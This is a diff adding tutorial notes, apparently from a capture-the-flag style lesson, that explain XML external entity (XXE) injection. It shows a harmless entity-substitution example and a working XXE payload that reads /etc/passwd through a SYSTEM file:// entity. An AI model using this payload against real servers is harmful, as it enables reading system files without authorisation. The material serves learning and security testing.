@@ -111,3 +111,20 @@ NOTE: #PCDATA means parseable character data.
 !doctype to define a ROOT element
 !entity to define a new entity
 
+XXE payload and see how they are working:
+1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.
+2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.
+If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.
+
